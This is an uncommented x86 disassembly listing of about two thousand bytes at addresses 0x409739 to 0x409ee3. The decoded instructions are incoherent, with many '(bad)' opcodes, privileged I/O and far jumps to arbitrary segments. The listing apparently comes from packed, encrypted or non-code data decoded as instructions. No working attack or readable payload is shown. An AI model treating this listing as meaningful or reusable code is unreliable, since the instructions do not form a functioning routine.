  409739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40973a:	or     DWORD PTR [ecx-0x14],0xc46c49e0
  409741:	cmp    DWORD PTR [eax+esi*1-0x40],0x7a
  409746:	fiadd  DWORD PTR ds:[esi]
  409749:	adc    al,0x9
  40974b:	mov    WORD PTR [eax-0x53d26cc0],?
  409751:	sub    eax,esp
  409753:	cwde   
  409754:	xlat   BYTE PTR ds:[ebx]
  409755:	loop   0x4096f6
  409757:	mov    ebx,0x9a2526ce
  40975c:	sbb    DWORD PTR ds:0x3e5fad36,ebp
  409762:	jnp    0x40975f
  409764:	cmp    DWORD PTR [edi-0x61c33774],0x8
  40976b:	adc    ecx,ebx
  40976d:	add    ecx,DWORD PTR [eax+0x57]
  409770:	mov    ebp,0x719f744c
  409775:	imul   ebx,DWORD PTR [ecx+0x69],0x3d7a66c7
  40977c:	sbb    DWORD PTR [ebx-0x1a815c45],ebx
  409782:	jge    0x409765
  409784:	int    0x88
  409786:	outs   dx,DWORD PTR ds:[esi]
  409787:	sti    
  409788:	xchg   esi,eax
  409789:	popa   
  40978a:	pop    ecx
  40978b:	push   esp
  40978c:	mov    dh,0xe2
  40978e:	push   eax
  40978f:	xor    al,0x55
  409791:	mov    edx,0x7d780b7
  409796:	inc    ebp
  409797:	cli    
  409798:	cwde   
  409799:	scas   eax,DWORD PTR es:[edi]
  40979a:	imul   edi
  40979c:	test   DWORD PTR [ebx+0x4cd8d22f],esp
  4097a2:	jg     0x409787
  4097a4:	mov    edx,0x30933456
  4097a9:	mov    esi,0x94d2ab0f
  4097ae:	jb     0x409786
  4097b0:	int3   
  4097b1:	mov    ds:0x61efa8d3,eax
  4097b6:	jo     0x409822
  4097b8:	or     BYTE PTR [edx],0x6f
  4097bb:	in     al,0x6e
  4097bd:	dec    ebx
  4097be:	idiv   BYTE PTR [esi+0x68]
  4097c1:	ffree  st(7)
  4097c3:	(bad)  
  4097c4:	and    esp,DWORD PTR [edi+0x77]
  4097c7:	imul   eax,esp,0x39c0b88
  4097cd:	and    al,0x7b
  4097cf:	adc    BYTE PTR [edi],dl
  4097d1:	sbb    eax,0x370613a9
  4097d6:	xor    al,0x5a
  4097d8:	sub    al,0x27
  4097da:	jp     0x4097db
  4097dc:	je     0x40983d
  4097de:	cdq    
  4097df:	adc    edi,esp
  4097e1:	cdq    
  4097e2:	iret   
  4097e3:	xchg   edi,eax
  4097e4:	cwde   
  4097e5:	add    dl,ah
  4097e7:	cmp    eax,0xffffffe7
  4097ea:	jmp    FWORD PTR [esi+edi*8-0x54]
  4097ee:	cmc    
  4097ef:	pop    esp
  4097f0:	dec    ebx
  4097f1:	test   al,dh
  4097f3:	pushf  
  4097f4:	dec    ebp
  4097f5:	jmp    0x40983e
  4097f7:	inc    ebp
  4097f8:	fsubr  DWORD PTR [esi+0x61f43d0e]
  4097fe:	push   ecx
  4097ff:	icebp  
  409800:	xchg   edi,eax
  409801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409802:	fxch   st(2)
  409804:	jae    0x409827
  409806:	mov    eax,ds:0xa7f8d8b6
  40980b:	es mov ch,0xee
  40980e:	dec    ecx
  40980f:	sti    
  409810:	(bad)  
  409811:	daa    
  409812:	(bad)  
  409813:	pop    ds
  409814:	imul   ebx,DWORD PTR [esi+ebx*4+0x303768d1],0x97ddd1e9
  40981f:	(bad)  
  409820:	mov    esp,0x4a250b39
  409825:	dec    edi
  409826:	jmp    0x4097e5
  409828:	shr    DWORD PTR [ebp+0x2],1
  40982b:	mov    ah,0x2a
  40982d:	xchg   esi,eax
  40982e:	mov    gs,WORD PTR cs:[edx-0x7]
  409832:	cmp    esp,DWORD PTR [ecx+0x2cc481a3]
  409838:	or     al,0x9e
  40983a:	imul   esi,ebx,0xf9e64775
  409840:	sub    BYTE PTR [ebx+0x7688d538],bh
  409846:	inc    eax
  409847:	shr    esi,cl
  409849:	dec    DWORD PTR [edx-0x5b]
  40984c:	test   eax,0x1089f5b7
  409851:	das    
  409852:	pusha  
  409853:	mov    eax,ds:0x4d68d553
  409858:	test   eax,0x12657bd
  40985d:	outs   dx,DWORD PTR ds:[esi]
  40985e:	ins    DWORD PTR es:[edi],dx
  40985f:	pop    ds
  409860:	or     eax,DWORD PTR [edi]
  409862:	icebp  
  409863:	add    DWORD PTR [edi+0x3526cf3],esp
  409869:	adc    bl,BYTE PTR ds:0x1190d792
  40986f:	sbb    eax,0xa99e16ef
  409874:	xchg   ah,dh
  409876:	aas    
  409877:	ss push eax
  409879:	stc    
  40987a:	sbb    al,BYTE PTR ds:[esi+edi*1-0x52005f22]
  409882:	cmp    dh,BYTE PTR [eax+0xd60fdac]
  409888:	dec    esp
  409889:	mov    eax,ds:0xe498c271
  40988e:	xchg   ebp,eax
  40988f:	in     eax,0x4f
  409891:	and    esp,DWORD PTR [eax+0x9]
  409894:	repz cli 
  409896:	lods   al,BYTE PTR ds:[esi]
  409897:	dec    ecx
  409898:	je     0x40990b
  40989a:	pop    ecx
  40989b:	and    al,0x8e
  40989d:	(bad)  
  40989e:	cld    
  40989f:	(bad)  
  4098a0:	cmp    BYTE PTR [edx-0x5b2545e7],bh
  4098a6:	arpl   WORD PTR cs:[eax+0x4710ea2e],dx
  4098ad:	cmc    
  4098ae:	fdiv   QWORD PTR [eax-0x3efd88f9]
  4098b4:	retf   
  4098b5:	jecxz  0x409914
  4098b7:	clc    
  4098b8:	pusha  
  4098b9:	es jp  0x4098da
  4098bc:	pop    esi
  4098bd:	out    0x32,eax
  4098bf:	retf   0xafef
  4098c2:	inc    ebp
  4098c3:	popa   
  4098c4:	push   eax
  4098c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098c6:	je     0x409944
  4098c8:	bnd jp 0x409944
  4098cb:	scas   eax,DWORD PTR es:[edi]
  4098cc:	xor    BYTE PTR [ebp+0x73],dl
  4098cf:	in     al,dx
  4098d0:	lahf   
  4098d1:	inc    esp
  4098d2:	fisub  WORD PTR [ebp+0x55]
  4098d5:	(bad)  
  4098d6:	out    dx,eax
  4098d7:	xor    BYTE PTR cs:[edi+0x14f45380],dh
  4098de:	pop    esp
  4098df:	mov    esi,0x12396be8
  4098e4:	inc    edi
  4098e5:	popf   
  4098e6:	call   0x789dbff0
  4098eb:	pop    esi
  4098ec:	bound  ecx,QWORD PTR [ecx]
  4098ee:	mov    dh,0xd8
  4098f0:	fldcw  WORD PTR [esi+0x650ecd78]
  4098f6:	xor    eax,eax
  4098f8:	dec    esi
  4098f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098fa:	mov    esi,?
  4098fc:	test   ebp,0xd9fed5a5
  409902:	(bad)  
  409903:	mov    esp,0x58f7a264
  409908:	add    al,0x78
  40990a:	in     eax,dx
  40990b:	gs (bad) 
  40990d:	jmp    0x8dbd:0x15c240d5
  409914:	sbb    esi,ecx
  409916:	cmp    BYTE PTR [esi+edi*2+0x73],dh
  40991a:	pop    ecx
  40991b:	test   eax,0x148c1a28
  409920:	(bad)  
  409921:	mov    ds:0x83fdcbbe,al
  409926:	std    
  409927:	and    al,0x6a
  409929:	lahf   
  40992a:	das    
  40992b:	test   ebp,eax
  40992d:	call   0xb0878427
  409932:	je     0x409914
  409934:	or     ah,bh
  409936:	popf   
  409937:	cld    
  409938:	mov    al,0xcf
  40993a:	or     al,0x23
  40993c:	adc    esi,DWORD PTR [esi+0x46dad79a]
  409942:	cmc    
  409943:	rol    ebx,cl
  409945:	and    ch,bl
  409947:	leave  
  409948:	mov    ch,0x3f
  40994a:	call   0xf0086598
  40994f:	dec    esp
  409950:	jo     0x40996f
  409952:	stc    
  409953:	mov    esp,0xd02b94b8
  409958:	and    ch,BYTE PTR es:[ecx]
  40995b:	cmc    
  40995c:	gs jle 0x4099c3
  40995f:	adc    al,0x5c
  409961:	jno    0x4098ed
  409963:	mov    esi,0x4d15ca2b
  409968:	inc    esi
  409969:	ret    0x2e89
  40996c:	mov    ds:0xc38cf02e,eax
  409971:	mov    eax,0xc5776983
  409976:	push   cs
  409977:	add    edx,DWORD PTR [edx+0x39]
  40997a:	(bad)  [eax+0x15da5fc4]
  409980:	push   edx
  409981:	mov    esi,0x8e783982
  409986:	jmp    0xdbc:0x1324701f
  40998d:	adc    DWORD PTR ds:0x4a051fa6,0x2f
  409994:	addr16 hlt 
  409996:	jmp    0x409926
  409998:	sub    ebp,esi
  40999a:	xchg   BYTE PTR [ecx],bl
  40999c:	loope  0x40999f
  40999e:	and    ch,0x45
  4099a1:	sub    eax,0xb41d62fe
  4099a6:	int    0xb0
  4099a8:	mov    bh,0xe
  4099aa:	fwait
  4099ab:	xlat   BYTE PTR ds:[ebx]
  4099ac:	or     eax,0x6f316750
  4099b1:	jmp    0x409970
  4099b3:	mov    eax,0x5405fc51
  4099b8:	lods   al,BYTE PTR ds:[esi]
  4099b9:	add    DWORD PTR [esp+eax*8-0x35],eax
  4099bd:	sbb    DWORD PTR [edi],ebx
  4099bf:	faddp  st(1),st
  4099c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099c2:	in     al,dx
  4099c3:	fnstsw WORD PTR [ecx+ebp*4-0x28]
  4099c7:	les    eax,FWORD PTR [edi+0xb84cedb]
  4099cd:	mov    ds:0x6e3743d4,eax
  4099d2:	scas   al,BYTE PTR es:[edi]
  4099d3:	and    eax,0x90439927
  4099d8:	sti    
  4099d9:	cmp    ebp,edx
  4099db:	and    eax,0x58a7328b
  4099e0:	mov    BYTE PTR [ebp+ebp*2-0xd],dh
  4099e4:	jae    0x409a4c
  4099e6:	mov    ah,0x8f
  4099e8:	(bad)  
  4099e9:	jns    0x40999a
  4099eb:	adc    ebp,ebx
  4099ed:	push   cs
  4099ee:	test   al,0xda
  4099f0:	jg     0x4099a3
  4099f2:	adc    BYTE PTR [esi+0x47],bl
  4099f5:	lods   eax,DWORD PTR ds:[esi]
  4099f6:	ret    
  4099f7:	sbb    DWORD PTR [eax],ebp
  4099f9:	sbb    DWORD PTR [esi],esi
  4099fb:	sub    cl,BYTE PTR [edx]
  4099fd:	fcom   DWORD PTR [edi]
  4099ff:	fmul   QWORD PTR gs:[ebx+edi*8]
  409a03:	js     0x40998c
  409a05:	cld    
  409a06:	mov    dl,0x93
  409a08:	xchg   edi,eax
  409a09:	(bad)  
  409a0a:	push   ebp
  409a0b:	pusha  
  409a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a0d:	fdiv   DWORD PTR [esi-0x2c8b4a2c]
  409a13:	mov    eax,0x44dd7fa0
  409a18:	lea    edi,[ebx]
  409a1a:	(bad)  
  409a1b:	mov    esp,0x6ef43cce
  409a20:	das    
  409a21:	inc    edi
  409a22:	sbb    esp,DWORD PTR [ebx]
  409a24:	in     eax,0x10
  409a26:	ficom  DWORD PTR [eax+0x23]
  409a29:	mov    dl,0xf3
  409a2b:	repnz xchg ecx,eax
  409a2d:	test   bh,al
  409a2f:	fucomp st(7)
  409a31:	daa    
  409a32:	sub    al,0xc1
  409a34:	add    esp,DWORD PTR [eax-0xe2e6a2f]
  409a3a:	into   
  409a3b:	xchg   edi,eax
  409a3c:	adc    ch,BYTE PTR ds:0x5c7a8c86
  409a42:	cmp    al,0xd2
  409a44:	fst    DWORD PTR [ebp+0x122bf606]
  409a4a:	xchg   DWORD PTR [ecx+ebx*8-0x8],eax
  409a4e:	mov    esi,0x96c3155c
  409a53:	aas    
  409a54:	xchg   edi,eax
  409a55:	aad    0x97
  409a57:	ja     0x409a54
  409a59:	sub    al,0x48
  409a5b:	push   edx
  409a5c:	push   edx
  409a5d:	repnz call 0x7ce8:0x7878a185
  409a65:	sub    bh,BYTE PTR [edi-0x55]
  409a68:	jle    0x4099ec
  409a6a:	inc    ecx
  409a6b:	adc    eax,DWORD PTR [edi+0x51]
  409a6e:	lods   eax,DWORD PTR ds:[esi]
  409a6f:	cmp    DWORD PTR [edx-0x7b],edi
  409a72:	sbb    al,al
  409a74:	loopne 0x409a59
  409a76:	and    eax,0x9ded6fbf
  409a7b:	xor    DWORD PTR [edx+0x1c3a7c3b],edx
  409a81:	xchg   dh,bh
  409a83:	pop    ss
  409a84:	fdiv   QWORD PTR ds:0xa50b4f59
  409a8a:	jnp    0x409a21
  409a8c:	ja     0x409af2
  409a8e:	ficomp DWORD PTR [edi-0x5b]
  409a91:	xor    eax,0x8fde69e9
  409a96:	sub    ch,BYTE PTR [ebx-0x547d26f9]
  409a9c:	das    
  409a9d:	mov    DWORD PTR [edx+0x35c0d35a],ebx
  409aa3:	lods   eax,DWORD PTR ds:[esi]
  409aa4:	shl    DWORD PTR [ebx+edx*4],0xfe
  409aa8:	ja     0x409a37
  409aaa:	push   edx
  409aab:	and    BYTE PTR [edx+0x61],cl
  409aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aaf:	xchg   esp,eax
  409ab0:	jne    0x409a50
  409ab2:	dec    esp
  409ab3:	cld    
  409ab4:	stos   DWORD PTR es:[edi],eax
  409ab5:	mov    ch,0x6
  409ab7:	jl     0x409aa3
  409ab9:	outs   dx,DWORD PTR ds:[esi]
  409aba:	dec    edx
  409abb:	adc    eax,0x5cb98f87
  409ac0:	pop    ecx
  409ac1:	repnz lahf 
  409ac3:	xor    eax,0x3a101c83
  409ac8:	sar    dh,0xa3
  409acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409acc:	push   edx
  409acd:	dec    ebx
  409ace:	sub    al,0x3c
  409ad0:	repz mov dl,cl
  409ad3:	push   es
  409ad4:	mov    edi,0xb9c2e5d0
  409ad9:	(bad)  
  409ada:	or     eax,0x9958f791
  409adf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ae0:	jno    0x409a84
  409ae2:	iret   
  409ae3:	test   al,0xc8
  409ae5:	mov    edx,0x2993d5d9
  409aea:	(bad)  
  409aeb:	shr    cl,cl
  409aed:	sbb    ebx,DWORD PTR [eax]
  409aef:	(bad)  
  409af0:	shl    DWORD PTR [ebp+0x2f],0xac
  409af4:	clc    
  409af5:	add    eax,0x33eeb87
  409afa:	retf   0xcb72
  409afd:	xor    DWORD PTR [ebx-0x41d12e7e],0x4975012d
  409b07:	jg     0x409b4f
  409b09:	loope  0x409b1d
  409b0b:	or     al,0x5d
  409b0d:	inc    ecx
  409b0e:	sbb    DWORD PTR [ecx+0x2230a22c],edx
  409b14:	mov    ds:0xf3771af6,al
  409b19:	xor    DWORD PTR [esi+0x3e],esp
  409b1c:	push   esi
  409b1d:	cmp    DWORD PTR ds:[esi-0x4ae5a02c],ecx
  409b24:	sar    BYTE PTR [eax+edi*4-0x73],cl
  409b28:	stc    
  409b29:	pop    ss
  409b2a:	jmp    0x409ae8
  409b2c:	cmp    edx,DWORD PTR [edx]
  409b2e:	jae    0x409b56
  409b30:	pop    es
  409b31:	(bad)  [ebp+edx*2-0x4988f571]
  409b38:	and    DWORD PTR [eax],esp
  409b3a:	xchg   ecx,eax
  409b3b:	arpl   WORD PTR [edi-0x2c],bx
  409b3e:	aas    
  409b3f:	xchg   ebx,eax
  409b40:	mov    ebp,0xf35982e9
  409b45:	call   0x147c9bae
  409b4a:	xchg   ecx,eax
  409b4b:	test   BYTE PTR [eax],bh
  409b4d:	imul   eax,ecx,0xf6319b94
  409b53:	xor    dl,BYTE PTR [edx]
  409b55:	fstcw  WORD PTR [edi-0x75]
  409b59:	inc    esp
  409b5a:	icebp  
  409b5b:	mov    cl,0xc8
  409b5d:	sbb    al,BYTE PTR [eax+0x5daca33f]
  409b63:	push   0x38
  409b65:	pop    esp
  409b66:	jp     0x409b6a
  409b68:	push   edx
  409b69:	add    al,0x49
  409b6b:	rol    BYTE PTR [edx+0x3e],cl
  409b6e:	mov    ebp,0x2fe399b0
  409b73:	sahf   
  409b74:	mov    dl,0x6a
  409b76:	sub    al,0x8a
  409b78:	xchg   ebp,eax
  409b79:	fild   QWORD PTR [ebx]
  409b7b:	call   0xf067:0xd93c9deb
  409b82:	adc    al,0xbf
  409b84:	cmc    
  409b85:	test   eax,0x129ff3dd
  409b8a:	dec    eax
  409b8b:	in     al,0xdc
  409b8d:	dec    edx
  409b8e:	and    al,0xde
  409b90:	push   0xffffffae
  409b92:	aad    0xa6
  409b94:	stos   BYTE PTR es:[edi],al
  409b95:	and    bl,ah
  409b97:	rep outs dx,DWORD PTR ds:[esi]
  409b99:	das    
  409b9a:	push   esi
  409b9b:	int3   
  409b9c:	repnz rol BYTE PTR [ecx],cl
  409b9f:	ss aaa 
  409ba1:	xchg   ecx,eax
  409ba2:	jle    0x409b3b
  409ba4:	adc    BYTE PTR [ebx+0x58f8b5ce],dh
  409baa:	sub    cl,BYTE PTR [ecx+0x23803d79]
  409bb0:	imul   edx,DWORD PTR [esi],0x1ef0f0fe
  409bb6:	popf   
  409bb7:	test   DWORD PTR [esi+0x31],edi
  409bba:	pop    es
  409bbb:	sub    DWORD PTR [ebx+0x9],0x3c84019
  409bc2:	xor    BYTE PTR [esi+esi*1],dh
  409bc5:	dec    esi
  409bc6:	pop    ebp
  409bc7:	inc    edi
  409bc8:	push   esi
  409bc9:	adc    eax,0x254b98
  409bce:	inc    edx
  409bcf:	mov    ebx,eax
  409bd1:	adc    bl,BYTE PTR [esi]
  409bd3:	jmp    0x409c08
  409bd5:	cld    
  409bd6:	call   0x432d871d
  409bdb:	dec    esp
  409bdc:	add    ebx,DWORD PTR [ecx+0x5]
  409bdf:	inc    ecx
  409be0:	xor    bl,ah
  409be2:	in     eax,dx
  409be3:	addr16 es push esi
  409be6:	cmp    esp,edi
  409be8:	mov    al,0xf8
  409bea:	xchg   edx,eax
  409beb:	inc    esp
  409bec:	push   ss
  409bed:	xor    DWORD PTR [eax-0x7e31c95],esi
  409bf3:	imul   esi,DWORD PTR [ebp+edi*8-0x2e],0xffffffba
  409bf8:	es data16 aas 
  409bfb:	(bad)  
  409bfc:	outs   dx,DWORD PTR ds:[esi]
  409bfd:	nop
  409bfe:	clc    
  409bff:	push   edx
  409c00:	in     eax,dx
  409c01:	in     al,0xe4
  409c03:	push   esi
  409c04:	scas   al,BYTE PTR es:[edi]
  409c05:	imul   ebp,DWORD PTR [ecx+eax*8+0x7c],0x6d
  409c0a:	mov    esp,ebx
  409c0c:	add    edi,eax
  409c0e:	add    eax,0x83816f9c
  409c13:	pop    eax
  409c14:	mov    BYTE PTR [esp+ecx*8+0x4b],dl
  409c18:	sar    BYTE PTR [ecx+0x7c],1
  409c1b:	lods   al,BYTE PTR ds:[esi]
  409c1c:	cli    
  409c1d:	sbb    ebx,DWORD PTR [ecx+esi*8+0x52]
  409c21:	sub    eax,0x7c8110a0
  409c26:	int    0x6a
  409c28:	push   es
  409c29:	xchg   ecx,eax
  409c2a:	scas   al,BYTE PTR es:[edi]
  409c2b:	fadd   QWORD PTR [ecx]
  409c2d:	dec    ebp
  409c2e:	push   0xffffff96
  409c30:	mov    ch,0x62
  409c32:	inc    edx
  409c33:	pop    eax
  409c34:	popa   
  409c35:	repz mov al,0xc
  409c38:	jo     0x409c75
  409c3a:	xchg   ecx,eax
  409c3b:	jae    0x409c1d
  409c3d:	mov    al,0x1d
  409c3f:	or     al,0xe7
  409c41:	test   esi,0xf6736c66
  409c47:	xchg   ebx,eax
  409c48:	les    ebp,FWORD PTR [edx+0x2f]
  409c4b:	leave  
  409c4c:	clc    
  409c4d:	or     edx,DWORD PTR [eax]
  409c4f:	push   es
  409c50:	push   cs
  409c51:	(bad)  
  409c52:	xor    bl,BYTE PTR [esi]
  409c54:	adc    edi,DWORD PTR [ebx+0x29a17dff]
  409c5a:	xchg   ecx,eax
  409c5b:	xchg   edi,eax
  409c5c:	outs   dx,DWORD PTR ds:[esi]
  409c5d:	sub    ebx,DWORD PTR [eax-0x5039299c]
  409c63:	cmp    edi,esp
  409c65:	inc    ebp
  409c66:	aad    0x2c
  409c68:	inc    ebx
  409c69:	adc    al,0xe2
  409c6b:	or     al,0xbc
  409c6d:	ins    DWORD PTR es:[edi],dx
  409c6e:	mov    dh,0xab
  409c70:	push   0xffffffa3
  409c72:	cmp    esp,eax
  409c74:	dec    ebp
  409c75:	jbe    0x409c5e
  409c77:	mov    dh,0x8
  409c79:	in     al,0x14
  409c7b:	adc    BYTE PTR [ecx],0xf6
  409c7e:	lods   eax,DWORD PTR ds:[esi]
  409c7f:	ret    
  409c80:	mov    ch,0x86
  409c82:	ss push ebp
  409c84:	popf   
  409c85:	and    ch,ch
  409c87:	pop    ecx
  409c88:	rol    ecx,cl
  409c8a:	inc    esi
  409c8b:	mov    esi,DWORD PTR [ecx-0x103e0fb0]
  409c91:	pop    edi
  409c92:	sub    ecx,DWORD PTR [eax+0x72]
  409c95:	jmp    DWORD PTR [ebx]
  409c97:	xor    BYTE PTR [edi-0x48],0x18
  409c9b:	div    DWORD PTR [esi+edx*2+0x1ff646c]
  409ca2:	mov    ds:0x493cd5cf,al
  409ca7:	aaa    
  409ca8:	aas    
  409ca9:	out    dx,eax
  409caa:	scas   eax,DWORD PTR es:[edi]
  409cab:	pushf  
  409cac:	push   eax
  409cad:	or     al,0xaa
  409caf:	and    DWORD PTR [eax+0x21],0xffffffd2
  409cb3:	stos   BYTE PTR es:[edi],al
  409cb4:	fidivr DWORD PTR [edi+0x5]
  409cb7:	ins    BYTE PTR es:[edi],dx
  409cb8:	les    edx,FWORD PTR [edi-0x567a55c8]
  409cbe:	rcr    DWORD PTR fs:[edi-0x5af7d59b],cl
  409cc5:	out    dx,eax
  409cc6:	ror    DWORD PTR [ebx],0x16
  409cc9:	cs xchg ecx,eax
  409ccb:	mov    BYTE PTR [ebx+0x47],0x70
  409ccf:	inc    esi
  409cd0:	xchg   esp,eax
  409cd1:	xor    eax,0x3dd52c9e
  409cd6:	adc    bl,BYTE PTR [eax-0x19]
  409cd9:	push   ebx
  409cda:	popa   
  409cdb:	int3   
  409cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cdd:	mov    ebx,esp
  409cdf:	or     edi,DWORD PTR [eax-0x6c140d0c]
  409ce5:	pop    ebp
  409ce6:	fistp  QWORD PTR [edi-0x56]
  409ce9:	lods   al,BYTE PTR ds:[esi]
  409cea:	mov    ah,ch
  409cec:	int    0x7d
  409cee:	adc    al,0x1b
  409cf0:	cmc    
  409cf1:	test   al,0xac
  409cf3:	xor    al,0x5b
  409cf5:	icebp  
  409cf6:	fs or  eax,0xcaab4a3
  409cfc:	ret    
  409cfd:	stos   BYTE PTR es:[edi],al
  409cfe:	fistp  WORD PTR [ebp-0x5f]
  409d01:	pop    es
  409d02:	in     eax,0x4
  409d04:	xchg   esi,eax
  409d05:	xchg   ebx,eax
  409d06:	mov    ebp,0xb3d028b0
  409d0b:	sub    ah,BYTE PTR [ecx+0x6d]
  409d0e:	pop    es
  409d0f:	repnz call 0x4838:0xc41171c5
  409d17:	dec    esp
  409d18:	add    dh,ch
  409d1a:	mov    dl,0xbe
  409d1c:	inc    eax
  409d1d:	sbb    edi,DWORD PTR [ebx]
  409d1f:	cmp    cl,BYTE PTR [ebx]
  409d21:	arpl   di,bx
  409d23:	mov    cl,0x2f
  409d25:	mov    al,0xe6
  409d27:	js     0x409d1d
  409d29:	pop    esp
  409d2a:	gs test eax,0x96da6287
  409d30:	jp     0x409d08
  409d32:	xchg   edx,eax
  409d33:	adc    DWORD PTR [ebp+0x25],ebx
  409d36:	loope  0x409d95
  409d38:	fisttp QWORD PTR [edx+0x21]
  409d3b:	pop    ss
  409d3c:	sbb    BYTE PTR [ecx+0x374db30f],0x36
  409d43:	sub    ch,BYTE PTR [esi+esi*4+0x1d]
  409d47:	add    al,0xeb
  409d49:	cs jmp 0xb725:0x232290d9
  409d51:	out    0x1a,al
  409d53:	lea    esi,[ebx-0x799945c2]
  409d59:	sub    eax,DWORD PTR [edx]
  409d5b:	add    ebp,DWORD PTR [ecx+esi*8-0x686194e7]
  409d62:	lods   al,BYTE PTR ds:[esi]
  409d63:	push   edi
  409d64:	inc    eax
  409d65:	pop    esi
  409d66:	mov    ecx,0x294a6e01
  409d6b:	mov    ebp,0xc8ef8dd7
  409d70:	or     DWORD PTR [ecx-0x47d17cb6],edi
  409d76:	and    eax,0xad7fa430
  409d7b:	push   esi
  409d7c:	daa    
  409d7d:	jge    0x409d62
  409d7f:	call   0xcc5d:0xf2c5f4c7
  409d86:	aas    
  409d87:	jae    0x409da6
  409d89:	mov    edi,0xf0a3e8d2
  409d8e:	call   DWORD PTR [esi+0x2f8fa545]
  409d94:	and    eax,0xc201b4a7
  409d99:	ins    DWORD PTR es:[edi],dx
  409d9a:	jbe    0x409dae
  409d9c:	mov    ds:0xd560c064,eax
  409da2:	lock pusha 
  409da4:	stos   BYTE PTR es:[edi],al
  409da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409da6:	popf   
  409da7:	push   0xffffff93
  409da9:	hlt    
  409daa:	shr    BYTE PTR ds:0x5bfe608c,1
  409db0:	dec    edi
  409db1:	push   eax
  409db2:	jbe    0x409d54
  409db4:	call   0x2718ea66
  409db9:	cmove  ebx,DWORD PTR [edx+eiz*2-0x34]
  409dbe:	fbstp  TBYTE PTR [ecx]
  409dc0:	adc    esp,DWORD PTR [edx]
  409dc2:	out    dx,al
  409dc3:	pop    ecx
  409dc4:	jp     0x409d5c
  409dc6:	add    dl,BYTE PTR [ebp-0x2d]
  409dc9:	aaa    
  409dca:	xchg   ebp,eax
  409dcb:	sahf   
  409dcc:	jns    0x409d9e
  409dce:	in     eax,0x33
  409dd0:	xchg   ebx,eax
  409dd1:	test   al,0x44
  409dd3:	adc    BYTE PTR [esi],al
  409dd5:	bswap  ebp
  409dd7:	in     al,0x1a
  409dd9:	mov    dh,0x60
  409ddb:	jge    0x409e22
  409ddd:	push   cs
  409dde:	shl    DWORD PTR [edx+0x52],cl
  409de1:	loop   0x409e39
  409de3:	push   es
  409de4:	int3   
  409de5:	mov    ebp,fs
  409de7:	int    0x9c
  409de9:	mov    WORD PTR [edi],fs
  409deb:	mov    ebx,0x287536d5
  409df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409df1:	popf   
  409df2:	jbe    0x409e51
  409df4:	jnp    0x409e35
  409df6:	mov    ecx,ecx
  409df8:	test   eax,0xaa297600
  409dfd:	outs   dx,BYTE PTR ds:[esi]
  409dfe:	ror    BYTE PTR [edi-0x7af1ac90],cl
  409e04:	adc    BYTE PTR [esi],0x80
  409e07:	mov    cl,ah
  409e09:	pusha  
  409e0a:	push   ds
  409e0b:	sub    al,BYTE PTR [eax-0x27]
  409e0e:	push   ds
  409e0f:	dec    esp
  409e10:	mov    WORD PTR [esi+0x60e3399a],fs
  409e16:	mov    ds:0x47a40a8c,eax
  409e1b:	test   al,0xf3
  409e1d:	dec    eax
  409e1e:	or     DWORD PTR [edi-0x66],0xffffffad
  409e22:	lahf   
  409e23:	jne    0x409dcd
  409e25:	sti    
  409e26:	mov    dh,0xd5
  409e28:	cmc    
  409e29:	xchg   ebp,eax
  409e2a:	adc    BYTE PTR [ecx-0x122bc3bd],bh
  409e30:	cmp    al,0x17
  409e32:	sar    BYTE PTR [edi+0x7a],0x73
  409e36:	data16 idiv bl
  409e39:	fadd   DWORD PTR [ebx]
  409e3b:	xor    DWORD PTR [ebp+0x2],ebp
  409e3e:	cmc    
  409e3f:	popa   
  409e40:	and    dl,0x0
  409e43:	sub    eax,0xd7341399
  409e48:	dec    ebx
  409e49:	jmp    0x6454:0x7f2ed61c
  409e50:	in     eax,0xe8
  409e52:	add    DWORD PTR [ebp-0x64],0x34aa8034
  409e59:	inc    esp
  409e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e5b:	or     al,0x67
  409e5d:	aam    0x3f
  409e5f:	dec    edi
  409e60:	icebp  
  409e61:	inc    esi
  409e62:	mov    ch,0x73
  409e64:	sub    al,0xf0
  409e66:	scas   al,BYTE PTR es:[edi]
  409e67:	test   esp,esi
  409e69:	and    eax,0xf1687684
  409e6e:	mov    bl,0x70
  409e70:	(bad)  
  409e71:	lahf   
  409e72:	pop    edi
  409e73:	dec    ebp
  409e74:	inc    esi
  409e75:	fidivr DWORD PTR [edi-0x701d708a]
  409e7b:	(bad)  
  409e7c:	and    al,0xb5
  409e7e:	out    0xab,al
  409e80:	test   DWORD PTR [esi-0x69f5477e],ebx
  409e86:	loopne 0x409e90
  409e88:	mov    bl,0x74
  409e8a:	add    edi,ebp
  409e8c:	scas   al,BYTE PTR es:[edi]
  409e8d:	push   ss
  409e8e:	mov    WORD PTR [esi+0x2798efa4],fs
  409e94:	jne    0x409e44
  409e96:	add    eax,DWORD PTR [ecx-0x78]
  409e99:	cs test eax,0xdd711da1
  409e9f:	jg     0x409ef1
  409ea1:	sub    DWORD PTR [esi+0x5e70acdf],0xffffffe4
  409ea8:	add    bl,BYTE PTR [edi-0x7b]
  409eab:	adc    DWORD PTR [esi-0x33e570a],ecx
  409eb1:	mov    edx,0x81b3569a
  409eb6:	in     al,dx
  409eb7:	rol    DWORD PTR [ecx],cl
  409eb9:	fs pop esp
  409ebb:	mov    bh,0xfd
  409ebd:	pushf  
  409ebe:	ss xchg ebx,eax
  409ec0:	call   0x44c3ef64
  409ec5:	push   esi
  409ec6:	inc    DWORD PTR es:[ebp-0x3e4c3c9f]
  409ecd:	push   cs
  409ece:	pop    ebx
  409ecf:	scas   al,BYTE PTR es:[edi]
  409ed0:	push   ss
  409ed1:	fidiv  DWORD PTR [ecx-0x7f37b09c]
  409ed7:	rcr    BYTE PTR ds:0x336acbbf,0xd
  409ede:	data16 mov dh,0xc9
  409ee1:	lods   eax,DWORD PTR ds:[esi]
  409ee2:	xlat   BYTE PTR ds:[ebx]
  409ee3:	aas    
